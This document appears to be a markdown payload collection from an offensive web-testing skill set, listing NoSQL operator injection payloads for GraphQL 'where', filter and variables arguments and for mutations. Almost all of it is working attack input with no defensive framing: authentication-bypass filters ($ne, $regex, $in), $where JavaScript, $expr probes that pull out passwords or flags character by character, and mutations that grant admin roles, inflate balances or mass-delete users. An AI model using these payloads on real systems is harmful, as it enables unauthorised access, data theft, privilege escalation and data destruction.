# GraphQL + NoSQL — the `_where`/filter-args

## The `where`/`_where` arg — the filter-object

```graphql
{ users(where: {user: {$ne: null}}) { id } }
{ users(where: {user: {$gt: ""}}) { id } }
{ users(where: {user: {$regex: "^a"}}) { id } }
{ users(where: {user: {$regex: ".*"}}) { id } }
{ users(where: {user: {$in: ["admin", "root"]}}) { id } }
{ users(where: {user: {$nin: ["nobody"]}}) { id } }
{ users(where: {user: {$exists: true}}) { id } }
{ users(where: {user: {$type: "string"}}) { id } }
{ users(where: {user: {$size: 0}}) { id } }
{ users(where: {user: {$all: ["x"]}}) { id } }
{ users(where: {user: {$mod: [4, 0]}}) { id } }
{ users(where: {user: {$elemMatch: {x: {$gt: 0}}}}) { id } }
{ users(where: {user: {$where: "this.pass"}}) { id } }
{ users(where: {user: {$not: {$eq: "x"}}}) { id } }
{ users(where: {user: {$not: {$ne: null}}}) { id } }
{ users(where: {user: {$not: {$in: ["x"]}}}) { id } }
{ users(where: {user: {$not: {$regex: "^a"}}}) { id } }
{ users(where: {user: {$not: {$exists: false}}}) { id } }
{ users(where: {user: {$not: {$type: "null"}}}) { id } }
{ users(where: {user: {$not: {$size: 0}}}) { id } }
{ users(where: {user: {$not: {$all: ["x"]}}}) { id } }
{ users(where: {user: {$not: {$mod: [4, 0]}}}) { id } }
{ users(where: {user: {$not: {$elemMatch: {x: {$gt: 0}}}}}) { id } }
{ users(where: {user: {$not: {$where: "this.pass"}}) { id } }
{ users(where: {$or: [{user: "admin"}, {user: "root"}]}) { id } }
{ users(where: {$or: [{user: {$ne: null}}, {user: "x"}]}) { id } }
{ users(where: {$or: [{user: {$ne: null}}]}) { id } }
{ users(where: {$and: [{user: {$ne: null}}, {pass: {$ne: null}}]}) { id } }
{ users(where: {$nor: [{user: "nobody"}]}) { id } }
{ users(where: {$where: "this.user == 'admin'"}) { id } }
{ users(where: {$expr: {$eq: [{$substrCP: ["$pass", 0, 4]}, "flag"]}}) { id } }
{ users(where: {$expr: {$eq: [{$strLenCP: "$pass"}, 32]}}) { id } }
{ users(where: {$expr: {$eq: [{$indexOfCP: ["$pass", "{"]}, 4]}}) { id } }
{ users(where: {$expr: {$eq: [{$toUpper: "$pass"}, "FLAG{X}"]}}) { id } }
{ users(where: {$expr: {$eq: [{$toLower: "$pass"}, "flag{x}"]}}) { id } }
{ users(where: {$expr: {$eq: [{$strcasecmp: ["$pass", "flag{x}"]}, 0]}}) { id } }
{ users(where: {$expr: {$regexMatch: {input: "$pass", regex: "^a"}}}) { id } }
{ users(where: {$expr: {$regexMatch: {input: "$pass", regex: "^.{32}$"}}}) { id } }
{ users(where: {$expr: {$regexMatch: {input: "$pass", regex: "^flag\\{"}}}) { id } }
{ users(where: {$expr: {$regexMatch: {input: "$pass", regex: "\\}$"}}}) { id } }
{ users(where: {$comment: "x"}) { id } }
{ users(where: {$natural: 1}) { id } }
{ users(where: {$hint: {user: 1}}) { id } }
{ users(where: {$maxScan: 100}) { id } }
{ users(where: {$snapshot: true}) { id } }
{ users(where: {$orderby: {user: 1}}) { id } }
{ users(where: {$readPreference: {mode: "primary"}}) { id } }
{ users(where: {$explain: true}) { id } }
{ users(where: {$maxTimeMS: 100}) { id } }
{ users(where: {$query: {user: "admin"}}) { id } }
```

`web-graphql`'s `where`-arg — `injection-points.md` — the object-shape
inside GraphQL — `skills/web-graphql/` for the GraphQL-side details.

## The `filter`/`input`/`data`/`args`/`params`/`variables` args — the carriers

```graphql
{ users(filter: {user: {$ne: null}}) { id } }
{ users(input: {user: {$ne: null}}) { id } }
{ users(data: {user: {$ne: null}}) { id } }
{ users(args: {user: {$ne: null}}) { id } }
{ users(params: {user: {$ne: null}}) { id } }
{ users(query: {user: {$ne: null}}) { id } }
{ users(find: {user: {$ne: null}}) { id } }
{ users(search: {user: {$ne: null}}) { id } }
{ users(criteria: {user: {$ne: null}}) { id } }
{ users(selector: {user: {$ne: null}}) { id } }
{ users(conditions: {user: {$ne: null}}) { id } }
{ users(match: {user: {$ne: null}}) { id } }
{ users(projection: {user: {$ne: null}}) { id } }
{ users(fields: {user: {$ne: null}}) { id } }
{ users(sort: {user: 1}) { id } }
{ users(sort: {user: -1}) { id } }
{ users(sort: {flag: 1}) { id } }
{ users(sort: {pass: 1}) { id } }
{ users(sort: {secret: 1}) { id } }
{ users(sort: {token: 1}) { id } }
{ users(sort: {key: 1}) { id } }
{ users(sort: {role: 1}) { id } }
{ users(sort: {admin: 1}) { id } }
{ users(sort: {isAdmin: 1}) { id } }
{ users(sort: {is_admin: 1}) { id } }
{ users(sort: {privileges: 1}) { id } }
{ users(sort: {permission: 1}) { id } }
{ users(limit: 1) { id } }
{ users(limit: 100) { id } }
{ users(limit: 1000) { id } }
{ users(skip: 0) { id } }
{ users(skip: 10) { id } }
{ users(skip: 100) { id } }
{ users(offset: 0) { id } }
{ users(offset: 10) { id } }
{ users(offset: 100) { id } }
{ users(first: 1) { id } }
{ users(first: 100) { id } }
{ users(last: 1) { id } }
{ users(after: "x") { id } }
{ users(before: "x") { id } }
{ users(cursor: "x") { id } }
{ users(from: "x") { id } }
{ users(to: "x") { id } }
{ users(range: "x") { id } }
{ users(start: "x") { id } }
{ users(end: "x") { id } }
```

The `filter`/`input`/`data`/`args`/`params`/`variables`/`query`/`find`/
`search`/`criteria`/`selector`/`conditions`/`match`/`projection`/`fields`/
`sort`/`limit`/`skip`/`offset`/`first`/`last`/`after`/`before`/`cursor`/
`from`/`to`/`range`/`start`/`end` — `injection-points.md`.

## The `query`-with-variables — the `variables` carrier

```graphql
query ($w: JSON) { users(where: $w) { id } }
```

```json
{"w": {"user": {"$ne": null}}}
{"w": {"user": {"$gt": ""}}}
{"w": {"user": {"$regex": "^a"}}}
{"w": {"user": {"$in": ["admin"]}}}
{"w": {"user": {"$exists": true}}}
{"w": {"$or": [{"user": "admin"}]}}
{"w": {"$expr": {"$eq": [{"$substrCP": ["$pass", 0, 4]}, "flag"]}}}
{"w": {"$where": "this.user == 'admin'"}}
{"w": {"user": {"$where": "this.pass"}}}
```

The `variables` — `injection-points.md` — the `JSON`/`JSONObject`/
`JSONObjectScalar`/`Any`/`AnyScalar`/`Dynamic`/`GenericScalar` scalar
types accept raw objects — `filter-bypass.md`.

## The `mutation` — the write-side

```graphql
mutation { updateUser(user: "me", update: {$set: {role: "admin"}}) { id } }
mutation { updateUser(user: "me", update: {$unset: {isLocked: ""}}) { id } }
mutation { updateUser(user: "me", update: {$inc: {balance: 9999}}) { id } }
mutation { updateUser(user: "me", update: {$push: {roles: "admin"}}) { id } }
mutation { updateUser(user: "me", update: {$addToSet: {perms: "*"}}) { id } }
mutation { updateUser(user: "me", update: {$pull: {bans: "me"}}) { id } }
mutation { updateUser(user: "me", update: {$rename: {flag: "user"}}) { id } }
mutation { updateUser(user: "me", update: {$mul: {score: 2}}) { id } }
mutation { updateUser(user: "me", update: {$min: {limit: 0}}) { id } }
mutation { updateUser(user: "me", update: {$max: {cap: 999}}) { id } }
mutation { updateUser(user: "me", update: {$currentDate: {ts: true}}) { id } }
mutation { updateUser(user: "me", update: {$bit: {flags: {and: 15}}}) { id } }
mutation { updateUser(user: "me", update: {$setOnInsert: {admin: true}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$literal: "x"}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$ifNull: ["$flag", "x"]}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$concat: ["$a", "$b"]}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$toUpper: "$a"}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$toLower: "$a"}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$trim: {input: "$a"}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$substrCP: ["$a", 0, 4]}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$split: ["$a", "{"]}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$arrayElemAt: [{$split: ["$a", "{"]}, 0]}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$convert: {input: "$a", to: "string"}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$toString: "$a"}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$toInt: "$a"}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$toObjectId: "$a"}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$dateFromString: {dateString: "$a"}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$dateToString: {date: "$a", format: "%Y-%m-%d"}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$let: {vars: {p: "$a"}, in: "$$p"}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$map: {input: "$a", as: "i", in: "$$i"}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$filter: {input: "$a", as: "i", cond: {$gt: ["$$i", 0]}}}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$reduce: {input: "$a", initialValue: 0, in: {$add: ["$$value", "$$this"]}}}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$cond: [{$eq: ["$a", "x"]}, "yes", "no"]}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$ifNull: ["$a", "x"]}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$switch: {branches: [{case: {$eq: ["$a", "x"]}, then: "y"}], default: "z"}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$function: {body: "function(a) { return a; }", args: ["$a"], lang: "js"}}}) { id } }
mutation { updateUser(user: "me", update: {$set: {flag: {$accumulator: {init: "function() { return 0; }", accumulate: "function(s, a) { return s + a; }", accumulateArgs: ["$a"], merge: "function(a, b) { return a + b; }", lang: "js"}}}) { id } }
mutation { deleteUser(user: {$ne: null}) { id } }
mutation { deleteUser(user: {$ne: "admin"}) { id } }
mutation { deleteUser(user: {$in: ["a", "b"]}) { id } }
mutation { deleteUser(user: {$nin: ["admin"]}) { id } }
mutation { deleteUser(user: {$exists: true}) { id } }
mutation { deleteUser(user: {$type: "string"}) { id } }
mutation { deleteUser(user: {$regex: "^a"}) { id } }
mutation { deleteUser(user: {$where: "this.user != 'admin'"}) { id } }
mutation { deleteUser(user: {$expr: {$ne: ["$user", "admin"]}}) { id } }
mutation { deleteUser(user: {$not: {$eq: "admin"}}) { id } }
mutation { deleteUser(user: {$not: {$in: ["admin"]}}) { id } }
mutation { deleteUser(user: {$not: {$regex: "^a"}}) { id } }
mutation { deleteUser(user: {$and: [{user: {$ne: null}}, {user: {$ne: "admin"}}]}) { id } }
mutation { deleteUser(user: {$or: [{user: "a"}, {user: "b"}]}) { id } }
mutation { deleteUser(user: {$nor: [{user: "admin"}]}) { id } }
mutation { deleteUser(user: {$comment: "x", $nor: [{user: "admin"}]}) { id } }
```

`mutation` — `update-injection.md` — the write-side.
